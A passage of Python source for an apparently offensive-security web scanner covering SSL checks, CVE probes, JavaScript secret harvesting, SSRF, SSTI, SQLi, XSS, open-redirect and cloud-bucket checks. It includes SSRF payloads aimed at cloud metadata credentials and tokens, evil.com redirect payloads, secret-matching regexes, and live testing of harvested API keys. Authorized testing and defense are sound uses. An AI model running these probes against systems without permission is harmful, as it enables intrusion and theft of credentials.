# ══════════════════════════════════════════════════════════════
def phase_ssl(live_file: str, out_dir: str):
    section("PHASE 7 — SSL/TLS Analysis")
    ssl_dir = f"{out_dir}/ssl"
    os.makedirs(ssl_dir, exist_ok=True)

    if tool_exists("testssl.sh") or tool_exists("testssl"):
        cmd = "testssl.sh" if tool_exists("testssl.sh") else "testssl"
        run(f"while read host; do {cmd} --quiet --severity HIGH --json "
            f"--logfile {ssl_dir}/$(echo $host | tr '/:' '_').json $host 2>/dev/null; "
            f"done < {live_file}", timeout=1200)

    if tool_exists("nmap"):
        out = f"{ssl_dir}/nmap_ssl.txt"
        ssl_hosts = f"{ssl_dir}/ssl_hosts.txt"
        run(f"sed 's|https://||g;s|http://||g;s|/.*||g;s|:.*||g' {live_file} | sort -u > {ssl_hosts}", timeout=10)
        run(f"nmap -iL {ssl_hosts} -p 443,8443 --script ssl-heartbleed,ssl-poodle,"
            f"ssl-ccs-injection,ssl-dh-params,sslv2 -oN {out} -T4 2>/dev/null", timeout=600)
        ok(f"SSL nmap scan → {out}")

    expired_out = f"{ssl_dir}/expired_certs.txt"
    with open(expired_out, "w") as f_out:
        hosts = [l.strip() for l in open(live_file) if "https://" in l][:100] if Path(live_file).exists() else []
        for host in hosts:
            hostname = host.replace("https://", "").split("/")[0].split(":")[0]
            r = run(f"echo | timeout 5 openssl s_client -connect {hostname}:443 "
                    f"-servername {hostname} 2>/dev/null | openssl x509 -noout -dates 2>/dev/null", timeout=10)
            for line in r.stdout.splitlines():
                if "notAfter" in line:
                    expiry_str = line.split("=", 1)[1].strip()
                    try:
                        expiry = datetime.strptime(expiry_str, "%b %d %H:%M:%S %Y %Z")
                        if expiry < datetime.now():
                            msg = f"[EXPIRED CERT] {hostname} → {expiry_str}"
                            warn(msg); f_out.write(msg + "\n")
                    except Exception:
                        pass
    ok(f"Expired certs: {count_lines(expired_out)}")

# ══════════════════════════════════════════════════════════════
# PHASE 8 — CVE-Specific Exploit Checks (nmap NSE + nuclei)
# ══════════════════════════════════════════════════════════════
def phase_cve_checks(live_file: str, nmap_xml: str, out_dir: str):
    section("PHASE 8 — CVE-Specific Exploit Checks")
    cve_dir = f"{out_dir}/cve_checks"
    os.makedirs(cve_dir, exist_ok=True)

    if not tool_exists("nuclei"):
        warn("nuclei required for CVE checks — skipping")
        return

    cve_json = f"{cve_dir}/nuclei_cve.json"
    run(f"nuclei -l {live_file} -tags cve -severity critical,high "
        f"-o {cve_dir}/nuclei_cve.txt -jle {cve_json} "
        f"-rate-limit 100 -bs 20 -c 20 "
        f"-timeout 15 -retries 2 -silent 2>/dev/null", timeout=3600)

    found_cves = []
    if Path(cve_json).exists():
        for line in open(cve_json):
            line = line.strip()
            if not line:
                continue
            try:
                item = json.loads(line)
                if not isinstance(item, dict):
                    continue
                classification = ((item.get("info") or {}).get("classification") or {})
                if not isinstance(classification, dict):
                    classification = {}
                cve_ids = classification.get("cve-id", [])
                if isinstance(cve_ids, str):
                    cve_ids = [cve_ids] if cve_ids else []
                cvss = classification.get("cvss-score", "N/A")
                name = (item.get("info") or {}).get("name", "")
                host = item.get("matched-at", "")
                sev  = (item.get("info") or {}).get("severity", "")
                for cid in cve_ids:
                    found_cves.append({"cve":cid,"cvss":cvss,"name":name,"host":host,"severity":sev})
                    crit(f"{cid} (CVSS {cvss}) — {name} @ {host}")
            except Exception:
                continue

    cve_summary = f"{cve_dir}/cve_summary.txt"
    with open(cve_summary, "w") as f:
        f.write(f"CVE Findings — {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'='*60}\n\n")
        if found_cves:
            found_cves.sort(key=lambda x: float(x.get("cvss",0)) if str(x.get("cvss",0)).replace(".","").isdigit() else 0, reverse=True)
            for e in found_cves:
                f.write(f"{e['cve']} | CVSS {e['cvss']} | {e['severity'].upper()} | {e['name']} | {e['host']}\n")
        else:
            f.write("No CVEs found.\n")
    ok(f"CVE findings: {len(found_cves)} → {cve_summary}")

    if tool_exists("nmap"):
        # nmap needs bare hostnames, not https:// URLs
        nmap_cve_hosts = f"{cve_dir}/nmap_hosts.txt"
        run(f"sed 's|https://||g;s|http://||g;s|/.*||g;s|:.*||g' {live_file} | sort -u > {nmap_cve_hosts}", timeout=10)
        nse_checks = [
            ("EternalBlue MS17-010",    "445",    "smb-vuln-ms17-010"),
            ("BlueKeep CVE-2019-0708",  "3389",   "rdp-vuln-ms12-020"),
            ("Heartbleed CVE-2014-0160","443",    "ssl-heartbleed"),
            ("POODLE CVE-2014-3566",    "443",    "ssl-poodle"),
            ("ShellShock CVE-2014-6271","80,443", "http-shellshock"),
            ("Log4Shell CVE-2021-44228","80,443", "http-log4shell"),
            ("PrintNightmare",          "445",    "smb-vuln-ms10-054"),
        ]
        for name, port, script in nse_checks:
            info(f"NSE: {name}…")
            out = f"{cve_dir}/nmap_{script}.txt"
            run(f"nmap -iL {nmap_cve_hosts} -p {port} --script {script} -oN {out} -T4 --open 2>/dev/null", timeout=300)
            try:
                if "VULNERABLE" in Path(out).read_text():
                    crit(f"{name} — VULNERABLE HOSTS FOUND → {out}")
            except FileNotFoundError:
                pass

# ══════════════════════════════════════════════════════════════
# PHASE 9 — JS Deep Secret & Endpoint Analyzer
# ══════════════════════════════════════════════════════════════
JS_SECRETS = {
    # Vendor-specific prefixed keys — very low FP rate
    "AWS Access Key":       r"AKIA[0-9A-Z]{16}",
    "AWS Secret Key":       r"(?i)aws.{0,30}secret.{0,30}['\"][0-9a-zA-Z/+]{40}['\"]",
    "GitHub Token":         r"gh[pousr]_[0-9a-zA-Z]{36,}",
    "GitLab Token":         r"glpat-[0-9a-zA-Z\-_]{20}",
    "Google API Key":       r"AIza[0-9A-Za-z\-_]{35}",
    "Stripe Live Key":      r"sk_live_[0-9a-zA-Z]{24,}",
    "Slack Token":          r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[0-9a-zA-Z]{24,}",
    "Slack Webhook":        r"https://hooks\.slack\.com/services/T[0-9A-Z]{8,}/B[0-9A-Z]{8,}/[0-9a-zA-Z]{20,}",
    "SendGrid Key":         r"SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}",
    "Private Key":          r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY",
    "Cloudinary URL":       r"cloudinary://[0-9]+:[A-Za-z0-9_\-]{10,}@[a-z]+",
    # Database URLs only for non-local, non-example hosts
    "Database URL":         r"(mysql|postgres(?:ql)?|mongodb(?:\+srv)?|redis|mssql)://[^\s\"'<>@]+:[^\s\"'<>@]{6,}@(?!localhost|127\.|0\.0\.0|example)[^\s\"'<>]+",
    "Mapbox Token":         r"pk\.[a-zA-Z0-9]{60}\.[a-zA-Z0-9]{22}",
    "NPM Token":            r"npm_[A-Za-z0-9]{36}",
    "Square Access Token":  r"sq0atp-[0-9A-Za-z\-_]{22}",
    "PayPal/Braintree":     r"access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}",
    # JWT — only report ones with a real signature segment (not short demo tokens)
    "JWT":                  r"eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}",
    # Generic password — tightened: must have real value, not a placeholder word
    "Generic Secret":       r"(?i)(api_key|apikey|api_secret|app_secret|auth_token|access_token|client_secret)\s*[:=]\s*['\"][A-Za-z0-9_\-\.]{20,}['\"]",
}

JS_ENDPOINT_PATTERNS = [
    r'["\'](/(?:api|v\d+|rest|graphql|internal|admin|backend|service|auth|oauth|login|user|account|payment|webhook)[^"\']*)["\']',
    r'["\']([a-z0-9_\-/]+\.(?:json|xml|yaml|yml|php|asp|aspx|jsp|do|action))["\']',
    r'(?:fetch|axios|xhr|http\.get|http\.post|request)\s*\(\s*["\']([^"\']+)["\']',
    r'(?:url|endpoint|baseUrl|apiUrl|api_url|host)\s*[:=]\s*["\']([^"\']{5,})["\']',
]
JS_INTERNAL_IP_RE = re.compile(
    r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|'
    r'192\.168\.\d{1,3}\.\d{1,3}|127\.\d{1,3}\.\d{1,3}\.\d{1,3}|localhost)\b'
)

def _analyze_js_url(url: str, beautify: bool) -> list[dict]:
    content = _fetch_js(url)
    if not content:
        return []
    if beautify and tool_exists("js-beautify"):
        try:
            r = subprocess.run(["js-beautify","--stdin"], input=content,
                               capture_output=True, text=True, timeout=10)
            if r.returncode == 0 and r.stdout:
                content = r.stdout
        except Exception:
            pass
    results = []
    seen_secrets: set[str] = set()
    for label, pattern in JS_SECRETS.items():
        for m in re.finditer(pattern, content):
            val = m.group(0)
            # Skip obvious placeholders / documentation values
            if _JS_FP_RE.search(val):
                continue
            # Skip duplicate values (same secret found in multiple places)
            dedup_key = f"{label}:{val[:60]}"
            if dedup_key in seen_secrets:
                continue
            seen_secrets.add(dedup_key)
            # For Generic Secret: require the extracted value itself to look real
            if label == "Generic Secret":
                # Pull just the value part between the quotes
                inner = re.search(r'[\'"]([A-Za-z0-9_\-\.]{20,})[\'"]', val)
                if not inner:
                    continue
                inner_val = inner.group(1)
                # Must not be all one character class (e.g. all letters or all digits)
                if inner_val.isalpha() or inner_val.isdigit():
                    continue
                # Must have at least 3 distinct character types
                char_types = sum([
                    bool(re.search(r'[A-Z]', inner_val)),
                    bool(re.search(r'[a-z]', inner_val)),
                    bool(re.search(r'[0-9]', inner_val)),
                    bool(re.search(r'[_\-\.]', inner_val)),
                ])
                if char_types < 2:
                    continue
            results.append({"type":"secret","label":label,"value":val[:120],"url":url,
                             "line":content[:m.start()].count('\n')+1})
    seen_ep: set[str] = set()
    for pattern in JS_ENDPOINT_PATTERNS:
        for m in re.finditer(pattern, content, re.IGNORECASE):
            ep = m.group(1).strip()
            if ep not in seen_ep and len(ep) >= 3:
                seen_ep.add(ep)
                results.append({"type":"endpoint","value":ep,"url":url})
    seen_ips: set[str] = set()
    for m in JS_INTERNAL_IP_RE.finditer(content):
        ip = m.group(0)
        if ip in seen_ips:
            continue
        seen_ips.add(ip)
        # Skip IPs that appear in version strings, CSS, or common build artifacts
        context = content[max(0,m.start()-30):m.end()+30]
        # Skip if surrounded by version-like digits (e.g. 1.172.31.0 in semver)
        if re.search(r'\d\.\d+\.\d+\.\d+\.\d+', context):
            continue
        # Only report if the IP appears in a meaningful context (config, URL, assignment)
        if not re.search(r'(?:url|host|server|api|endpoint|addr|connect|proxy|base)\s*[:=]', context, re.IGNORECASE):
            if not re.search(r'["\']https?://' + re.escape(ip), context):
                continue
        results.append({"type":"internal_ip","value":ip,"url":url})
    return results

def phase_js_analyzer(out_dir: str, threads: int = 20):
    section("PHASE 9 — JS Deep Secret & Endpoint Analyzer")
    js_file = f"{out_dir}/js_files.txt"
    if not Path(js_file).exists() or count_lines(js_file) == 0:
        warn("No JS files list found — skipping")
        return

    urls = [l.strip() for l in open(js_file) if l.strip()]
    info(f"Analyzing {len(urls)} JS files with {threads} threads…")

    js_dir = f"{out_dir}/js_analysis"
    os.makedirs(js_dir, exist_ok=True)

    all_findings: list[dict] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
        futs = {pool.submit(_analyze_js_url, u, True): u for u in urls}
        done = 0
        for fut in concurrent.futures.as_completed(futs):
            done += 1
            if done % 100 == 0:
                info(f"JS progress: {done}/{len(urls)} | findings: {len(all_findings)}")
            try:
                res = fut.result()
                for r in res:
                    if r["type"] == "secret":
                        crit(f"[JS:{r['label']}] {r['url']} → {r['value'][:80]}")
                all_findings.extend(res)
            except Exception:
                pass

    raw_secrets = [x for x in all_findings if x["type"]=="secret"]
    endpoints   = list({x["value"] for x in all_findings if x["type"]=="endpoint"})
    internals   = [x for x in all_findings if x["type"]=="internal_ip"]

    # Cross-file deduplication: same label+value appearing in 16 subdomains = 1 finding
    # Keep first occurrence URL; annotate how many files contained it
    seen_global: dict[str, dict] = {}   # key: "label:value[:60]"
    seen_count:  dict[str, int]  = {}
    for s in raw_secrets:
        key = f"{s['label']}:{s['value'][:60]}"
        if key not in seen_global:
            seen_global[key] = s
            seen_count[key] = 1
        else:
            seen_count[key] += 1
    secrets = list(seen_global.values())

    # Validate Google API Keys — check if they work outside the target domain
    # (restricted keys return 403 with CORS error; unrestricted ones return real data)
    validated_secrets: list[dict] = []
    for s in secrets:
        if s["label"] == "Google API Key":
            key_val = s["value"].strip()
            orig_count_key = f"{s['label']}:{s['value'][:60]}"
            # Test with a neutral referer — if restricted, Google returns usageLimits error
            test_url = (f"https://maps.googleapis.com/maps/api/geocode/json"
                        f"?address=test&key={key_val}")
            try:
                r = subprocess.run(
                    ["curl","-sk","--max-time","8","-H","Referer: https://attacker.com", test_url],
                    capture_output=True, text=True, timeout=10)
                resp = r.stdout
                if '"REQUEST_DENIED"' in resp or '"keyInvalid"' in resp or \
                   "API keys are not supported" in resp or "usageLimits" in resp:
                    # Restricted or invalid — downgrade to info, not worth reporting
                    new_label = "Google API Key (restricted/invalid)"
                    s = dict(s, label=new_label, severity="info")
                    # Preserve original count under new key so display is correct
                    new_key = f"{new_label}:{s['value'][:60]}"
                    seen_count[new_key] = seen_count.pop(orig_count_key, 1)
                elif '"OK"' in resp or '"ZERO_RESULTS"' in resp:
                    # Works from any domain — real finding, keep as critical
                    pass
            except Exception:
                pass
        validated_secrets.append(s)
    secrets = validated_secrets

    # Suppress Generic Secret if its value was already captured by a specific pattern
    specific_values = {s["value"][:60] for s in secrets if s["label"] != "Generic Secret"}
    secrets = [s for s in secrets
               if not (s["label"] == "Generic Secret" and s["value"][:60] in specific_values)]

    # Print only unique findings
    for s in secrets:
        key = f"{s['label']}:{s['value'][:60]}"
        count = seen_count.get(key, 1)
        suffix = f" (×{count} files)" if count > 1 else ""
        sev = s.get("severity","")
        if sev != "info":
            crit(f"[JS:{s['label']}]{suffix} {s['url']} → {s['value'][:80]}")

    # Write only deduplicated secrets (not raw per-file findings) to findings.json
    # so _load_all_findings doesn't inflate counts
    deduped_for_report = [
        {**s, "severity": s.get("severity","critical")}
        for s in secrets
    ] + [
        {"type":"endpoint","value":ep,"url":"","severity":"info"}
        for ep in endpoints
    ]
    Path(f"{js_dir}/findings.json").write_text(json.dumps(deduped_for_report, indent=2))
    with open(f"{js_dir}/secrets.txt","w") as f:
        by_label: dict[str,list] = {}
        for s in secrets:
            by_label.setdefault(s["label"],[]).append(s)
        for label, items in sorted(by_label.items()):
            f.write(f"[{label}] ({len(items)} unique values)\n")
            for item in items:
                key = f"{item['label']}:{item['value'][:60]}"
                count = seen_count.get(key, 1)
                sev_tag = f"  Severity: {item['severity']}\n" if "severity" in item else ""
                f.write(f"  URL  : {item['url']}{' (+' + str(count-1) + ' more files)' if count > 1 else ''}\n"
                        f"  Value: {item['value']}\n{sev_tag}\n")
    Path(f"{js_dir}/endpoints.txt").write_text("\n".join(sorted(endpoints)))
    with open(f"{js_dir}/internals.txt","w") as f:
        for i in internals:
            f.write(f"[{i['type']}] {i['value']} (from {i['url']})\n")

    real_secrets = [s for s in secrets if s.get("severity","critical") != "info"]
    ok(f"JS secrets: {C.BOLD}{len(real_secrets)}{C.RESET} unique | endpoints: {len(endpoints)} | internal refs: {len(internals)}")

# ══════════════════════════════════════════════════════════════
# PHASE 10 — SSRF Active Testing
# ══════════════════════════════════════════════════════════════
SSRF_METADATA_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    "http://169.254.169.254/metadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost/","http://127.0.0.1/","http://[::1]/",
    "http://0177.0.0.1/","http://0x7f000001/","http://2130706433/",
    "http://localhost:6379/","http://localhost:9200/","http://localhost:27017/",
    "http://localhost:2375/","http://localhost:8500/",
]
# Tightened patterns — must match actual metadata content, not JS strings in HTML
SSRF_POSITIVE_RE = [re.compile(p, re.IGNORECASE) for p in [
    # AWS: these strings only appear in real metadata responses
    r"\bami-[0-9a-f]+\b",                           # ami-1234abcd
    r'"instanceId"\s*:\s*"i-[0-9a-f]',              # "instanceId": "i-..."
    r"security-credentials/[A-Za-z0-9\-_]+\s*$",    # role name on its own line
    r"placement/availability-zone",
    # GCP
    r'"access_token"\s*:\s*"ya29\.',
    r'"serviceAccounts"\s*:',
    # Azure
    r'"azureEnvironment"\s*:',
    r'"client_id"\s*:.*"subscription"',
    # Generic internal
    r"root:x:0:0:",                                  # /etc/passwd
    r"^\+PONG",                                      # Redis PONG
    r'^\{"cluster_name"',                            # Elasticsearch root
    r'^\[{"Id":"[0-9a-f]{64}"',                      # Docker /containers/json
]]

def _ssrf_inject(url: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return ""
    key = list(params.keys())[0]
    params[key] = [payload]
    return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(params, doseq=True)))

def _test_ssrf_url(url: str, oob_host: str, timeout: int) -> list[dict]:
    findings = []
    # Baseline: fetch original URL to get expected response size/content
    baseline_sc, _, baseline_body = _curl_timed(url, timeout)
    baseline_len = len(baseline_body)

    for payload in SSRF_METADATA_PAYLOADS:
        injected = _ssrf_inject(url, payload)
        if not injected:
            continue
        sc, elapsed, body = _curl_timed(injected, timeout)

        # Only flag HTTP 200 (not 301/302 which are just redirects from redirect= params)
        if sc != 200:
            continue
        # Reject HTML bodies — the app is just rendering its own page
        if _HTML_START_RE.search(body[:200]):
            continue
        # Reject if response is virtually identical to baseline (injection had no effect)
        if baseline_len > 0 and abs(len(body) - baseline_len) < 50:
            continue
        if any(p.search(body) for p in SSRF_POSITIVE_RE):
            findings.append({"type":"ssrf_metadata","severity":"critical","url":url,
                             "injected":injected,"payload":payload,"status":sc,"body":body[:300]})
            crit(f"SSRF METADATA | {payload} → HTTP {sc} | {url}")
            break
    if oob_host:
        marker = abs(hash(url)) % 100000
        oob_payload = f"http://{marker}.{oob_host}/"
        injected = _ssrf_inject(url, oob_payload)
        if injected:
            _curl_timed(injected, timeout)
    return findings

def phase_ssrf_tester(out_dir: str, oob_host: str = "", threads: int = 10, timeout: int = 10):
    section("PHASE 10 — SSRF Active Testing")
    ssrf_file = f"{out_dir}/manual_checks/ssrf_candidates.txt"
    if not Path(ssrf_file).exists() or count_lines(ssrf_file) == 0:
        warn("No SSRF candidates found — run phase 6 first or check manual_checks/")
        return

    urls = [l.strip() for l in open(ssrf_file) if l.strip()]
    info(f"Testing {len(urls)} SSRF candidates | OOB={oob_host or 'disabled'}")
    ssrf_dir = f"{out_dir}/ssrf_results"
    os.makedirs(ssrf_dir, exist_ok=True)

    all_findings: list[dict] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
        futs = {pool.submit(_test_ssrf_url, u, oob_host, timeout): u for u in urls}
        done = 0
        for fut in concurrent.futures.as_completed(futs):
            done += 1
            if done % 200 == 0:
                info(f"SSRF progress: {done}/{len(urls)}")
            try:
                all_findings.extend(fut.result())
            except Exception:
                pass

    Path(f"{ssrf_dir}/ssrf_findings.json").write_text(json.dumps(all_findings, indent=2))
    with open(f"{ssrf_dir}/ssrf_report.txt","w") as f:
        f.write(f"SSRF Findings — {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'='*60}\n\n")
        for item in all_findings:
            f.write(f"[CRITICAL] SSRF\n  URL     : {item['url']}\n  Payload : {item['payload']}\n"
                    f"  Injected: {item['injected']}\n  Status  : {item['status']}\n"
                    f"  Body    : {item['body'][:200]}\n\n")
    ok(f"Confirmed SSRF: {C.BOLD}{len(all_findings)}{C.RESET} → {ssrf_dir}/ssrf_report.txt")

# ══════════════════════════════════════════════════════════════
# PHASE 11 — XSS / SQLi / SSTI Active Scanner
# ══════════════════════════════════════════════════════════════
SSTI_PAYLOADS = [
    ("{{7*7}}",r"49","Jinja2/Twig"),("${7*7}",r"49","FreeMarker"),
    ("#{7*7}",r"49","Thymeleaf"),("<%= 7*7 %>",r"49","ERB"),
    ("{{7*'7'}}",r"7777777","Jinja2"),("${{7*7}}",r"49","Spring SPEL"),
    ("{7*7}",r"49","Smarty"),("{{config}}",r"SECRET_KEY|DATABASE","Jinja2 leak"),
]
REDIRECT_PARAMS = {
    "url","redirect","next","return","returnUrl","return_to","goto","destination",
    "redir","redirect_uri","callback","out","view","to","target","link","src",
    "source","continue","location","ref"
}

def _test_ssti(url: str, cookie: str, timeout: int) -> list[dict]:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return []

    base_cmd = ["curl","-sk","--max-time",str(timeout),"-L","--max-redirs","3","-A","Mozilla/5.0"]
    if cookie:
        base_cmd += ["-H",f"Cookie: {cookie}"]

    # Get baseline response for the original URL (no injection)
    try:
        baseline_r = subprocess.run(base_cmd + [url], capture_output=True, text=True, timeout=timeout+2)
        baseline_body = baseline_r.stdout
    except Exception:
        baseline_body = ""

    findings = []
    for param_key in params:
        for payload, expected_re, engine in SSTI_PAYLOADS:
            # Skip if expected result ALREADY appears in baseline — not caused by injection
            if baseline_body and re.search(expected_re, baseline_body):
                continue
            test_params = dict(params)
            test_params[param_key] = [payload]
            test_url = urllib.parse.urlunparse(parsed._replace(
                query=urllib.parse.urlencode(test_params, doseq=True)))
            try:
                r = subprocess.run(base_cmd + [test_url], capture_output=True, text=True, timeout=timeout+2)
                # Reject HTML responses (SPA returning its own page for any URL)
                if _HTML_START_RE.search(r.stdout[:200]):
                    continue
                if re.search(expected_re, r.stdout):
                    findings.append({"type":"ssti","severity":"critical","url":url,"param":param_key,
                                     "payload":payload,"engine":engine,"body":r.stdout[:200]})
                    crit(f"SSTI ({engine}) | param='{param_key}' payload='{payload}' @ {url}")
                    break
            except Exception:
                continue
    return findings

def _test_redirect(url: str, timeout: int) -> list[dict]:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    findings = []
    for key in params:
        if key.lower() not in REDIRECT_PARAMS:
            continue
        for payload in ["https://evil.com","//evil.com","///evil.com"]:
            test_params = dict(params)
            test_params[key] = [payload]
            test_url = urllib.parse.urlunparse(parsed._replace(
                query=urllib.parse.urlencode(test_params, doseq=True)))
            try:
                r = subprocess.run(["curl","-sk","--max-time",str(timeout),"-I","--max-redirs","0",
                                    "-A","Mozilla/5.0",test_url],
                                   capture_output=True, text=True, timeout=timeout+2)
                loc = re.search(r"location:\s*(\S+)", r.stdout.lower())
                if loc and "evil.com" in loc.group(1):
                    findings.append({"type":"open_redirect","severity":"medium","url":url,
                                     "param":key,"payload":payload,"location":loc.group(1)})
                    crit(f"OPEN REDIRECT | param='{key}' → {loc.group(1)} @ {url}")
                    break
            except Exception:
                continue
    return findings

def phase_param_scanner(out_dir: str, cookie: str = "", threads: int = 20,
                        sqli_level: int = 1, sqli_risk: int = 1,
                        skip_xss: bool = False, skip_sqli: bool = False,
                        skip_ssti: bool = False, skip_redirect: bool = False):
    section("PHASE 11 — XSS / SQLi / SSTI Active Scanner")
    params_file = f"{out_dir}/params.txt"
    if not Path(params_file).exists() or count_lines(params_file) == 0:
        warn("No params.txt — run phase 4 first")
        return

    param_dir = f"{out_dir}/param_scan"
    os.makedirs(param_dir, exist_ok=True)
    all_findings: list[dict] = []

    # dalfox XSS
    if not skip_xss and tool_exists("dalfox"):
        info("Running dalfox for XSS…")
        xss_json = f"{param_dir}/xss_dalfox.json"
        # --format jsonl writes one JSON object per line to --output file
        dalfox_cmd = ["dalfox","file",params_file,"--silence","--no-color",
                      "--output",xss_json,"--format","jsonl",
                      "--worker",str(threads),"--timeout","10","--delay","100"]
        if cookie:
            dalfox_cmd += ["--cookie",cookie]
        try:
            subprocess.run(dalfox_cmd, capture_output=True, text=True, timeout=3600)
        except Exception:
            pass
        if Path(xss_json).exists():
            for line in open(xss_json, errors="ignore"):
                line = line.strip()
                if not line:
                    continue
                try:
                    item = json.loads(line)
                    all_findings.append({"type":"xss","severity":"high","data":item})
                    crit(f"XSS | {item.get('param','?')} @ {item.get('url','?')}")
                except json.JSONDecodeError:
                    if "[V]" in line or "POC" in line.upper():
                        all_findings.append({"type":"xss","severity":"high","raw":line})
        ok(f"XSS findings: {len([x for x in all_findings if x['type']=='xss'])}")
    elif not skip_xss:
        warn("dalfox not installed — skipping XSS (install: go install github.com/hahwul/dalfox/v2@latest)")

    # sqlmap SQLi
    if not skip_sqli and tool_exists("sqlmap"):
        info("Running sqlmap for SQLi…")
        sqlmap_out = f"{param_dir}/sqlmap"
        os.makedirs(sqlmap_out, exist_ok=True)
        sqli_cmd = ["sqlmap","-m",params_file,"--batch","--random-agent",
                    "--level",str(sqli_level),"--risk",str(sqli_risk),
                    "--threads","5","--output-dir",sqlmap_out,"--timeout","10",
                    "--retries","1","--answers","quit=N,crack=N,dict=N"]
        if cookie:
            sqli_cmd += ["--cookie",cookie]
        try:
            r = subprocess.run(sqli_cmd, capture_output=True, text=True, timeout=7200)
            vuln_re = re.compile(r"Parameter '([^']+)' is vulnerable", re.IGNORECASE)
            url_re  = re.compile(r"Target URL: (https?://\S+)", re.IGNORECASE)
            cur_url = ""
            for line in (r.stdout+r.stderr).splitlines():
                m = url_re.search(line)
                if m: cur_url = m.group(1)
                m = vuln_re.search(line)
                if m:
                    all_findings.append({"type":"sqli","severity":"critical","param":m.group(1),"url":cur_url})
                    crit(f"SQLi | param='{m.group(1)}' @ {cur_url}")
        except Exception:
            pass
        ok(f"SQLi findings: {len([x for x in all_findings if x['type']=='sqli'])}")
    elif not skip_sqli:
        warn("sqlmap not installed — skipping SQLi")

    # SSTI
    if not skip_ssti:
        info("Running SSTI probes…")
        urls = [l.strip() for l in open(params_file) if l.strip()]
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
            futs = {pool.submit(_test_ssti, u, cookie, 10): u for u in urls}
            for fut in concurrent.futures.as_completed(futs):
                try:
                    all_findings.extend(fut.result())
                except Exception:
                    pass
        ok(f"SSTI findings: {len([x for x in all_findings if x['type']=='ssti'])}")

    # Open redirect confirmation
    if not skip_redirect:
        info("Confirming open redirects…")
        redir_file = f"{out_dir}/manual_checks/open_redirect_candidates.txt"
        if Path(redir_file).exists():
            urls = [l.strip() for l in open(redir_file) if l.strip()]
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
                futs = {pool.submit(_test_redirect, u, 8): u for u in urls}
                for fut in concurrent.futures.as_completed(futs):
                    try:
                        all_findings.extend(fut.result())
                    except Exception:
                        pass
        ok(f"Open redirects confirmed: {len([x for x in all_findings if x['type']=='open_redirect'])}")

    Path(f"{param_dir}/findings.json").write_text(json.dumps(all_findings, indent=2))
    ok(f"Param scan total findings: {C.BOLD}{len(all_findings)}{C.RESET} → {param_dir}/")

# ══════════════════════════════════════════════════════════════
# PHASE 12 — Cloud Misconfiguration
# ══════════════════════════════════════════════════════════════
CLOUD_SERVICES_CHECK = [
    # (path, body_indicator_regex, service_name, severity)
    # body_indicator must match in the actual response body (not HTML) to confirm exposure
    ("",               r'"cluster_name"\s*:',           "Elasticsearch",    "critical"),
    ("/_cat/indices",  r'\b(green|yellow|red)\b.*\bopen\b', "Elasticsearch idx","critical"),
    ("/app/kibana",    r'kbn-version|"kibanaVersion"',   "Kibana",           "high"),
    ("/v1/kv/",        r'"LockIndex"\s*:',               "Consul KV",        "critical"),
    ("/v1/agent/self", r'"Config"\s*:\s*\{',             "Consul agent",     "high"),
    ("/version",       r'"ApiVersion"\s*:',              "Docker daemon",    "critical"),
    ("/containers/json",r'\[\{"Id":',                   "Docker API",       "critical"),
    ("/metrics",       r"^# HELP |^# TYPE ",            "Prometheus",       "medium"),
    ("/actuator/env",  r'"activeProfiles"\s*:',         "Spring Actuator",  "critical"),
    # heapdump: binary file — Content-Type must be octet-stream, not HTML
    ("/actuator/heapdump", r"__HEAPDUMP_BINARY__",      "Spring heapdump",  "critical"),
]

def _generate_bucket_names(domain: str) -> list[str]:
    parts = domain.split(".")
    bases = list(dict.fromkeys([parts[0], ".".join(parts[:-1])] + ([parts[1]] if len(parts)>2 else [])))
    suffixes = ["","-dev","-staging","-prod","-test","-backup","-assets","-static",
                "-media","-upload","-uploads","-files","-data","-logs","-images",
                "-public","-private","-internal","-api","-cdn","-archive","-bak"]
    names: set[str] = set()
    for base in bases:
        for suf in suffixes:
            names.add(f"{base}{suf}")
    return sorted(names)

def _check_s3(name: str) -> dict | None:
    for url in [f"https://{name}.s3.amazonaws.com/", f"https://s3.amazonaws.com/{name}/"]:
        sc, body = _curl_simple(url, 8)
        if "<ListBucketResult" in body or ("<Key>" in body and sc==200):
            return {"service":"S3","bucket":name,"url":url,"status":"OPEN-listable","severity":"critical","body":body[:400]}
        if "AccessDenied" in body:
            continue  # private bucket — not a vulnerability
    return None

def _check_azure(name: str) -> dict | None:
    for url in [f"https://{name}.blob.core.windows.net/",
                f"https://{name}.blob.core.windows.net/?restype=container&comp=list"]:
        sc, body = _curl_simple(url, 8)
        if "<EnumerationResults" in body or "<Container>" in body:
            return {"service":"Azure Blob","bucket":name,"url":url,"status":"OPEN-listable","severity":"critical","body":body[:400]}
    return None

def _check_gcp(name: str) -> dict | None:
    for url in [f"https://storage.googleapis.com/{name}/", f"https://{name}.storage.googleapis.com/"]:
        sc, body = _curl_simple(url, 8)
        if sc == 200:
